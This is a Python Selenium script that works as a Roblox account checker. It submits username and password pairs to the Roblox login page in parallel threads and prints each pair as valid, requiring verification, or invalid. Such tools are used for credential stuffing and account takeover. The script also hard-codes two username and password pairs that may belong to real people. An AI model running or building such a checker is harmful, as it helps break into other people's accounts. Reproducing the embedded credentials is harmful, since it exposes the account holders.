from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
import time
import threading

def check_account(username, password):
    driver = webdriver.Chrome()
    driver.get("https://www.roblox.com/login")

    time.sleep(2)

    username_field = driver.find_element(By.NAME, "username")
    password_field = driver.find_element(By.NAME, "password")

    username_field.send_keys(username)
    password_field.send_keys(password)
    password_field.send_keys(Keys.RETURN)

    time.sleep(5)

    if "verify" in driver.current_url:
        print(f"{username}:{password} - requires verification")
    elif "home" in driver.current_url:
        print(f"{username}:{password} - valid")
    else:
        print(f"{username}:{password} - invalid")

    driver.quit()

def main():
    accounts = [
        ("murphy2065", "Biggershaq99"),
        ("mxkxkks", "Ericgreen12"),
    ]
    
    threads = []
    for username, password in accounts:
        thread = threading.Thread(target=check_account, args=(username, password))
        threads.append(thread)
        thread.start()
    
    for thread in threads:
        thread.join()
    
    print("\nCheck complete. Closing in 10 seconds...")
    time.sleep(10)

if __name__ == "__main__":
    main()